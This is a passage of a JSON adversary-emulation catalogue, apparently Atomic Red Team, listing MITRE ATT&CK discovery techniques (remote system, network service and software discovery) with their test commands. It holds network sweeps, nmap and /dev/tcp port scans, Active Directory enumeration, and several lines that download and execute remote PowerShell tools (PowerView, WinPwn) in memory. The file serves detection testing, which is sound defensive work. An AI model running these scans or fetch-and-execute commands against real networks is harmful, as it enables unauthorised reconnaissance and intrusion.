"cleanup_command": "remove-item #{output_directory} -recurse -force -erroraction silentlycontinue\n", "name": "powershell"}}]}, "T1018": {"name": "Remote System Discovery", "technique_id": "attack-pattern--e358d692-23c0-4a31-9eb6-ecc13a8d7735", "external_id": "T1018", "data_components": ["Network Connection Creation", "Command Execution", "File Access", "Process Creation"], "kill_chain_phases": ["discovery"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  [Ping](https://attack.mitre.org/software/S0097) or <code>net view</code> using [Net](https://attack.mitre.org/software/S0039).\n\nAdversaries may also analyze data from local host files (ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> or <code>/etc/hosts</code>) or other passive means (such as local [Arp](https://attack.mitre.org/software/S0099) cache entries) in order to discover the presence of remote systems in an environment.\n\nAdversaries may also target discovery of network infrastructure as well as leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands on network devices to gather detailed information about systems within a network (e.g. <code>show cdp neighbors</code>, <code>show arp</code>).(Citation: US-CERT-TA18-106A)(Citation: CISA AR21-126A FIVEHANDS May 2021)  \n", "atomic_tests": [{"name": "Remote System Discovery - net", "auto_generated_guid": "85321a9c-897f-4a60-9f20-29788e50bccd", "description": "Identify remote systems with net.exe.\n\nUpon successful execution, cmd.exe will execute `net.exe view` and display results of local systems on the network that have file and print sharing enabled.\n", "supported_platforms": ["windows"], "executor": {"command": "net view /domain\nnet view\n", "name": "command_prompt"}}, {"name": "Remote System Discovery - net group Domain Computers", "auto_generated_guid": "f1bf6c8f-9016-4edf-aff9-80b65f5d711f", "description": "Identify remote systems with net.exe querying the Active Directory Domain Computers group.\n\nUpon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the \"Domain Computers\" group. Output will be via stdout.\n", "supported_platforms": ["windows"], "executor": {"command": "net group \"Domain Computers\" /domain\n", "name": "command_prompt"}}, {"name": "Remote System Discovery - nltest", "auto_generated_guid": "52ab5108-3f6f-42fb-8ba3-73bc054f22c8", "description": "Identify domain controllers for specified domain.\n\nUpon successful execution, cmd.exe will execute nltest.exe against a target domain to retrieve a list of domain controllers. Output will be via stdout.\n", "supported_platforms": ["windows"], "input_arguments": {"target_domain": {"description": "Domain to query for domain controllers", "type": "string", "default": "%userdnsdomain%"}}, "executor": {"command": "nltest.exe /dclist:#{target_domain}\n", "name": "command_prompt"}}, {"name": "Remote System Discovery - ping sweep", "auto_generated_guid": "6db1f57f-d1d5-4223-8a66-55c9c65a9592", "description": "Identify remote systems via ping sweep.\n\nUpon successful execution, cmd.exe will perform a for loop against the 192.168.1.1/24 network. Output will be via stdout.\n", "supported_platforms": ["windows"], "input_arguments": {"start_host": {"description": "Last octet starting value for ping sweep.", "type": "string", "default": "1"}, "stop_host": {"description": "Last octet ending value for ping sweep.", "type": "string", "default": "254"}, "subnet": {"description": "Subnet used for ping sweep.", "type": "string", "default": "192.168.1"}}, "executor": {"command": "for /l %i in (#{start_host},1,#{stop_host}) do ping -n 1 -w 100 #{subnet}.%i  \n", "name": "command_prompt"}}, {"name": "Remote System Discovery - arp", "auto_generated_guid": "2d5a61f5-0447-4be4-944a-1f8530ed6574", "description": "Identify remote systems via arp. \n\nUpon successful execution, cmd.exe will execute arp to list out the arp cache. Output will be via stdout.\n", "supported_platforms": ["windows"], "executor": {"command": "arp -a\n", "name": "command_prompt"}}, {"name": "Remote System Discovery - arp nix", "auto_generated_guid": "acb6b1ff-e2ad-4d64-806c-6c35fe73b951", "description": "Identify remote systems via arp.\n\nUpon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.\n", "supported_platforms": ["linux", "macos"], "dependency_executor_name": "sh", "dependencies": [{"description": "Check if arp command exists on the machine\n", "prereq_command": "if [ -x \"$(command -v arp)\" ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "(which yum && yum -y install net-tools)||(which apt-get && apt-get install -y net-tools)\n"}], "executor": {"command": "arp -a | grep -v '^?'\n", "name": "sh"}}, {"name": "Remote System Discovery - sweep", "auto_generated_guid": "96db2632-8417-4dbb-b8bb-a8b92ba391de", "description": "Identify remote systems via ping sweep.\n\nUpon successful execution, sh will perform a ping sweep on the 192.168.1.1/24 and echo via stdout if an IP is active.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"start_host": {"description": "Subnet used for ping sweep.", "type": "string", "default": "1"}, "stop_host": {"description": "Subnet used for ping sweep.", "type": "string", "default": "254"}, "subnet": {"description": "Subnet used for ping sweep.", "type": "string", "default": "192.168.1"}}, "executor": {"command": "for ip in $(seq #{start_host} #{stop_host}); do ping -c 1 #{subnet}.$ip; [ $? -eq 0 ] && echo \"#{subnet}.$ip UP\" || : ; done\n", "name": "sh"}}, {"name": "Remote System Discovery - nslookup", "auto_generated_guid": "baa01aaa-5e13-45ec-8a0d-e46c93c9760f", "description": "Powershell script that runs nslookup on cmd.exe against the local /24 network of the first network adaptor listed in ipconfig.\n\nUpon successful execution, powershell will identify the ip range (via ipconfig) and perform a for loop and execute nslookup against that IP range. Output will be via stdout.\n", "supported_platforms": ["windows"], "executor": {"command": "$localip = ((ipconfig | findstr [0-9].\\.)[0]).Split()[-1]\n$pieces = $localip.split(\".\")\n$firstOctet = $pieces[0]\n$secondOctet = $pieces[1]\n$thirdOctet = $pieces[2]\nforeach ($ip in 1..255 | % { \"$firstOctet.$secondOctet.$thirdOctet.$_\" } ) {cmd.exe /c nslookup $ip}\n", "name": "powershell", "elevation_required": true}}, {"name": "Remote System Discovery - adidnsdump", "auto_generated_guid": "95e19466-469e-4316-86d2-1dc401b5a959", "description": "This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks\nPython 3 and adidnsdump must be installed, use the get_prereq_command's to meet the prerequisites for this test.\nSuccessful execution of this test will list dns zones in the terminal.\n", "supported_platforms": ["windows"], "input_arguments": {"user_name": {"description": "username including domain.", "type": "string", "default": "domain\\user"}, "acct_pass": {"description": "Account password.", "type": "string", "default": "password"}, "host_name": {"description": "hostname or ip address to connect to.", "type": "string", "default": "192.168.1.1"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Computer must have python 3 installed\n", "prereq_command": "if (python --version) {exit 0} else {exit 1}\n", "get_prereq_command": "echo \"Python 3 must be installed manually\"\n"}, {"description": "Computer must have pip installed\n", "prereq_command": "if (pip3 -V) {exit 0} else {exit 1}\n", "get_prereq_command": "echo \"PIP must be installed manually\"\n"}, {"description": "adidnsdump must be installed and part of PATH\n", "prereq_command": "if (cmd /c adidnsdump -h) {exit 0} else {exit 1}\n", "get_prereq_command": "pip3 install adidnsdump\n"}], "executor": {"command": "adidnsdump -u #{user_name} -p #{acct_pass} --print-zones #{host_name}\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Adfind - Enumerate Active Directory Computer Objects", "auto_generated_guid": "a889f5be-2d54-4050-bd05-884578748bb4", "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Computer Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"}], "executor": {"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=computer)\n", "name": "command_prompt"}}, {"name": "Adfind - Enumerate Active Directory Domain Controller Objects", "auto_generated_guid": "5838c31e-a0e2-4b9f-b60a-d79d2cb7995e", "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Domain Controller Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"}], "executor": {"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -sc dclist\n", "name": "command_prompt"}}, {"name": "Remote System Discovery - ip neighbour", "auto_generated_guid": "158bd4dd-6359-40ab-b13c-285b9ef6fa25", "description": "Use the ip neighbour command to display the known link layer (ARP table) addresses for hosts sharing the same network segment. \n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "Check if ip command exists on the machine\n", "prereq_command": "if [ -x \"$(command -v ip)\" ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "apt-get install iproute2 -y\n"}], "executor": {"command": "ip neighbour show\n", "name": "sh"}}, {"name": "Remote System Discovery - ip route", "auto_generated_guid": "1a4ebe70-31d0-417b-ade2-ef4cb3e7d0e1", "description": "Use the ip route command to display the kernels routing tables. \n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "Check if ip command exists on the machine\n", "prereq_command": "if [ -x \"$(command -v ip)\" ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "apt-get install iproute2 -y\n"}], "executor": {"command": "ip route show\n", "name": "sh"}}, {"name": "Remote System Discovery - netstat", "auto_generated_guid": "d2791d72-b67f-4615-814f-ec824a91f514", "description": "Use the netstat command to display the kernels routing tables.\n", "supported_platforms": ["linux"], "executor": {"command": "netstat -r | grep default\n", "name": "sh"}}, {"name": "Remote System Discovery - ip tcp_metrics", "auto_generated_guid": "6c2da894-0b57-43cb-87af-46ea3b501388", "description": "Use the ip tcp_metrics command to display the recent cached entries for IPv4 and IPv6 source and destination addresses. \n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "Check if ip command exists on the machine\n", "prereq_command": "if [ -x \"$(command -v ip)\" ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "apt-get install iproute2 -y\n"}], "executor": {"command": "ip tcp_metrics show |grep --invert-match \"^127\\.\"\n", "name": "sh"}}, {"name": "Enumerate domain computers within Active Directory using DirectorySearcher", "auto_generated_guid": "962a6017-1c09-45a6-880b-adc9c57cb22e", "description": "This test is a Powershell script that enumerates Active Directory to determine computers that are joined to the domain. \nThis test is designed to mimic how SessionGopher can determine the additional systems within a domain, which has been used before by threat actors to aid in lateral movement. \nReference: [Head Fake: Tackling Disruptive Ransomware Attacks](https://www.mandiant.com/resources/head-fake-tackling-disruptive-ransomware-attacks). \nUpon successful execution, this test will output the names of the computers that reside on the domain to the console window. \n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "This PC must be joined to a domain.", "prereq_command": "if ((Get-WmiObject -Class Win32_ComputerSystem).partofdomain -eq $true) {exit 0} else {exit 1}", "get_prereq_command": "write-host \"This PC must be manually added to a domain.\" "}], "executor": {"command": "$DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher(\"(ObjectCategory=Computer)\")\n$DirectorySearcher.PropertiesToLoad.Add(\"Name\")\n$Computers = $DirectorySearcher.findall()\nforeach ($Computer in $Computers) {\n  $Computer = $Computer.Properties.name\n  if (!$Computer) { Continue }\n  Write-Host $Computer}\n", "name": "powershell", "elevation_required": false}}, {"name": "Enumerate Active Directory Computers with Get-AdComputer", "auto_generated_guid": "97e89d9e-e3f5-41b5-a90f-1e0825df0fdf", "description": "The following Atomic test will utilize Get-AdComputer to enumerate Computers within Active Directory.\nUpon successful execution a listing of Computers will output with their paths in AD.\nReference: https://github.com/MicrosoftDocs/windows-powershell-docs/blob/main/docset/winserver2022-ps/activedirectory/Get-ADComputer.md\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "Get-AdComputer -Filter *\n"}}, {"name": "Enumerate Active Directory Computers with ADSISearcher", "auto_generated_guid": "64ede6ac-b57a-41c2-a7d1-32c6cd35397d", "description": "The following Atomic test will utilize ADSISearcher to enumerate computers within Active Directory.\nUpon successful execution a listing of computers will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "([adsisearcher]\"objectcategory=computer\").FindAll(); ([adsisearcher]\"objectcategory=computer\").FindOne()\n"}}, {"name": "Get-DomainController with PowerView", "auto_generated_guid": "b9d2e8ca-5520-4737-8076-4f08913da2c4", "description": "Utilizing PowerView, run Get-DomainController to identify the Domain Controller. Upon execution, information about the domain controller within the domain will be displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose\n", "name": "powershell"}}, {"name": "Get-WmiObject to Enumerate Domain Controllers", "auto_generated_guid": "e3cf5123-f6c9-4375-bdf2-1bb3ba43a1ad", "description": "The following Atomic test will utilize get-wmiobject to enumerate Active Directory for Domain Controllers.\nUpon successful execution a listing of Systems from AD will output with their paths.\nReference: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "try { get-wmiobject -class ds_computer -namespace root\\directory\\ldap -ErrorAction Stop }\ncatch { $_; exit $_.Exception.HResult }\n"}}, {"name": "Remote System Discovery - net group Domain Controller", "auto_generated_guid": "5843529a-5056-4bc1-9c13-a311e2af4ca0", "description": "Identify remote systems with net.exe querying the Active Directory Domain Controller.\nUpon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the \"Domain Controller\" in the domain. Output will be via stdout.\n", "supported_platforms": ["windows"], "executor": {"command": "net group /domain \"Domain controllers\"\n", "name": "command_prompt"}}]}, "T1046": {"name": "Network Service Discovery", "technique_id": "attack-pattern--e3a12395-188d-4051-9a16-ea8e14d07b88", "external_id": "T1046", "data_components": ["Cloud Service Enumeration", "Command Execution", "Network Traffic Flow"], "kill_chain_phases": ["discovery"], "data_source_platforms": [], "mitigations": ["course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c", "course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system.(Citation: CISA AR21-126A FIVEHANDS May 2021)   \n\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.\n\nWithin macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host\u2019s registered services on the network. For example, adversaries can use a mDNS query (such as <code>dns-sd -B _ssh._tcp .</code>) to find other systems broadcasting the ssh service.(Citation: apple doco bonjour description)(Citation: macOS APT Activity Bradley)", "atomic_tests": [{"name": "Port Scan", "auto_generated_guid": "68e907da-2539-48f6-9fc9-257a78c05540", "description": "Scan ports to check for listening ports.\n\nUpon successful execution, sh will perform a network connection against a single host (192.168.1.1) and determine what ports are open in the range of 1-65535. Results will be via stdout.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"host": {"description": "Host to scan.", "type": "string", "default": "192.168.1.1"}}, "executor": {"command": "for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/#{host}/$port) && echo port $port is open ; done\n", "name": "bash"}}, {"name": "Port Scan Nmap", "auto_generated_guid": "515942b0-a09f-4163-a7bb-22fefb6f185f", "description": "Scan ports to check for listening ports with Nmap.\n\nUpon successful execution, sh will utilize nmap, telnet, and nc to contact a single or range of addresses on port 80 to determine if listening. Results will be via stdout.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"host": {"description": "Host to scan.", "type": "string", "default": "192.168.1.1"}, "port": {"description": "Ports to scan.", "type": "string", "default": "80"}, "network_range": {"description": "Network Range to Scan.", "type": "string", "default": "192.168.1.0/24"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Check if nmap command exists on the machine\n", "prereq_command": "if [ -x \"$(command -v nmap)\" ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "(which yum && yum -y install epel-release nmap)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y nmap)\n"}, {"description": "Check if nc command exists on the machine\n", "prereq_command": "if [ -x \"$(command -v nc)\" ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "(which yum && yum -y install epel-release nc)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y netcat)\n"}, {"description": "Check if telnet command exists on the machine\n", "prereq_command": "if [ -x \"$(command -v telnet)\" ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "(which yum && yum -y install epel-release telnet)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y telnet)\n"}], "executor": {"command": "sudo nmap -sS #{network_range} -p #{port}\ntelnet #{host} #{port}\nnc -nv #{host} #{port}\n", "name": "sh", "elevation_required": true}}, {"name": "Port Scan Nmap for FreeBSD", "auto_generated_guid": "f03d59dc-0e3b-428a-baeb-3499552c7048", "description": "Scan ports to check for listening ports with Nmap.\n\nUpon successful execution, sh will utilize nmap, telnet, and nc to contact a single or range of addresses on port 80 to determine if listening. Results will be via stdout.\n", "supported_platforms": ["linux"], "input_arguments": {"host": {"description": "Host to scan.", "type": "string", "default": "192.168.1.1"}, "port": {"description": "Ports to scan.", "type": "string", "default": "80"}, "network_range": {"description": "Network Range to Scan.", "type": "string", "default": "192.168.1.0/24"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Check if nmap command exists on the machine\n", "prereq_command": "if [ -x \"$(command -v nmap)\" ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "(which pkg && pkg install -y nmap)\n"}], "executor": {"command": "nmap -sS #{network_range} -p #{port}\ntelnet #{host} #{port}\nnc -nv #{host} #{port}\n", "name": "sh", "elevation_required": true}}, {"name": "Port Scan NMap for Windows", "auto_generated_guid": "d696a3cb-d7a8-4976-8eb5-5af4abf2e3df", "description": "Scan ports to check for listening ports for the local host 127.0.0.1", "supported_platforms": ["windows"], "input_arguments": {"nmap_url": {"description": "NMap installer download URL", "type": "url", "default": "https://nmap.org/dist/nmap-7.80-setup.exe"}, "host_to_scan": {"description": "The host to scan with NMap", "type": "string", "default": "127.0.0.1"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "NMap must be installed\n", "prereq_command": "if (cmd /c \"nmap 2>nul\") {exit 0} else {exit 1}", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\nmap-7.80-setup.exe\" #{nmap_url}\nStart-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\nmap-7.80-setup.exe\" /S\n"}], "executor": {"command": "nmap #{host_to_scan}", "name": "powershell", "elevation_required": true}}, {"name": "Port Scan using python", "auto_generated_guid": "6ca45b04-9f15-4424-b9d3-84a217285a5c", "description": "Scan ports to check for listening ports with python\n", "supported_platforms": ["windows"], "input_arguments": {"host_ip": {"description": "Host to scan.", "type": "string", "default": "127.0.0.1"}, "filename": {"description": "Location of the project file", "type": "path", "default": "PathToAtomicsFolder\\T1046\\src\\T1046.py"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Check if python exists on the machine\n", "prereq_command": "if (python --version) {exit 0} else {exit 1}\n", "get_prereq_command": "echo \"Python 3 must be installed manually\"\n"}], "executor": {"command": "python \"#{filename}\" -i #{host_ip}\n", "name": "powershell"}}, {"name": "WinPwn - spoolvulnscan", "auto_generated_guid": "54574908-f1de-4356-9021-8053dd57439a", "description": "Start MS-RPRN RPC Service Scan using spoolvulnscan function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nspoolvulnscan -noninteractive -consoleoutput", "name": "powershell"}}, {"name": "WinPwn - MS17-10", "auto_generated_guid": "97585b04-5be2-40e9-8c31-82157b8af2d6", "description": "Search for MS17-10 vulnerable Windows Servers in the domain using powerSQL function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nMS17-10 -noninteractive -consoleoutput", "name": "powershell"}}, {"name": "WinPwn - bluekeep", "auto_generated_guid": "1cca5640-32a9-46e6-b8e0-fabbe2384a73", "description": "Search for bluekeep vulnerable Windows Systems in the domain using bluekeep function of WinPwn. Can take many minutes to complete (~600 seconds in testing on a small domain).", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nbluekeep -noninteractive -consoleoutput", "name": "powershell"}}, {"name": "WinPwn - fruit", "auto_generated_guid": "bb037826-cbe8-4a41-93ea-b94059d6bb98", "description": "Search for potentially vulnerable web apps (low hanging fruits) using fruit function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nfruit -noninteractive -consoleoutput", "name": "powershell"}}, {"name": "Network Service Discovery for Containers", "auto_generated_guid": "06eaafdb-8982-426e-8a31-d572da633caa", "description": "Attackers may try to obtain a list of services that are operating on remote hosts and local network infrastructure devices, in order to identify potential vulnerabilities that can be exploited through remote software attacks. They typically use tools to conduct port and vulnerability scans in order to obtain this information.", "supported_platforms": ["containers"], "dependency_executor_name": "sh", "dependencies": [{"description": "Verify docker is installed.", "prereq_command": "which docker\n", "get_prereq_command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi\n"}, {"description": "Verify docker service is running.", "prereq_command": "sudo systemctl status docker  --no-pager\n", "get_prereq_command": "sudo systemctl start docker\n"}], "executor": {"command": "docker build -t t1046 /root/AtomicRedTeam/atomics/T1046/src/\ndocker run --name t1046_container  -d -t t1046\ndocker exec t1046_container ./test.sh", "cleanup_command": "docker stop t1046_container\ndocker rmi -f t1046", "name": "sh"}}, {"name": "Port-Scanning /24 Subnet with PowerShell", "auto_generated_guid": "05df2a79-dba6-4088-a804-9ca0802ca8e4", "description": "Scanning common ports in a /24 subnet. If no IP address for the target subnet is specified the test tries to determine the attacking machine's \"primary\" IPv4 address first and then scans that address with a /24 netmask.\nThe connection attempts to use a timeout parameter in milliseconds to speed up the scan. Please note the atomic might not print any output until the scans are completed.\n", "supported_platforms": ["windows"], "input_arguments": {"ip_address": {"description": "IP-Address within the target subnet. Default is empty and script tries to determine local IP address of attacking machine.", "type": "string", "default": ""}, "port_list": {"description": "Comma separated list of ports to scan", "type": "string", "default": "445, 3389"}, "timeout_ms": {"description": "Connection timeout in milliseconds", "type": "string", "default": "200"}}, "executor": {"command": "$ipAddr = \"#{ip_address}\"\nif ($ipAddr -eq \"\") {\n    # Assumes the \"primary\" interface is shown at the top\n    $interface = Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected | Select-Object -ExpandProperty InterfaceAlias -First 1\n    Write-Host \"[i] Using Interface $interface\"\n    $ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interface | Select-Object -ExpandProperty IPAddress\n}\nWrite-Host \"[i] Base IP-Address for Subnet: $ipAddr\"\n$subnetSubstring = $ipAddr.Substring(0, $ipAddr.LastIndexOf('.') + 1)\n# Always assumes /24 subnet\nWrite-Host \"[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'\"\n\n$ports = #{port_list}\n$subnetIPs = 1..254 | ForEach-Object { \"$subnetSubstring$_\" }\n\nforeach ($ip in $subnetIPs) {\n    foreach ($port in $ports) {\n      try {\n          $tcp = New-Object Net.Sockets.TcpClient\n          $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null\n      } catch {}\n      if ($tcp.Connected) {\n          $tcp.Close()\n          Write-Host \"Port $port is open on $ip\"\n      }\n    }\n}\n", "name": "powershell"}}]}, "T1518": {"name": "Software Discovery", "technique_id": "attack-pattern--e3b6daca-e963-4a69-aee6-ed4fd653ad58", "external_id": "T1518", "data_components": ["OS API Execution", "Process Creation", "Firewall Enumeration", "Command Execution", "Firewall Metadata"], "kill_chain_phases": ["discovery"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from [Software Discovery](https://attack.mitre.org/techniques/T1518) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).", "atomic_tests": [{"name": "Find and Display Internet Explorer Browser Version", "auto_generated_guid": "68981660-6670-47ee-a5fa-7e74806420a4", "description": "Query the registry to determine the version of internet explorer installed on the system.\nUpon execution, version information about internet explorer will be displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "reg query \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\" /v svcVersion\n", "name": "command_prompt"}}, {"name": "Applications Installed", "auto_generated_guid": "c49978f6-bd6e-4221-ad2c-9e3e30cc1e3b", "description": "Query the registry to determine software and versions installed on the system. Upon execution a table of\nsoftware name and version information will be displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize\nGet-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize\n", "name": "powershell"}}, {"name": "Find and Display Safari Browser Version", "auto_generated_guid": "103d6533-fd2a-4d08-976a-4a598565280f", "description": "Adversaries may attempt to get a listing of non-security related software that is installed on the system. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors\n", "supported_platforms": ["macos"], "executor": {"name": "sh", "elevation_required": false, "command": "/usr/libexec/PlistBuddy -c \"print :CFBundleShortVersionString\" /Applications/Safari.app/Contents/Info.plist\n/usr/libexec/PlistBuddy -c \"print :CFBundleVersion\" /Applications/Safari.app/Contents/Info.plist\n"}}, {"name": "WinPwn - Dotnetsearch", "auto_generated_guid": "7e79a1b6-519e-433c-ad55-3ff293667101", "description": "Search for any .NET binary file in a share using the Dotnetsearch function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nDotnetsearch -noninteractive -consoleoutput", "name": "powershell"}}, {"name": "WinPwn - DotNet", "auto_generated_guid": "10ba02d0-ab76-4f80-940d-451633f24c5b", "description": "Search for .NET Service-Binaries on this system via winpwn dotnet function of WinPwn.", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ndotnet -consoleoutput -noninteractive", "name": "powershell"}}, {"name": "WinPwn - powerSQL", "auto_generated_guid": 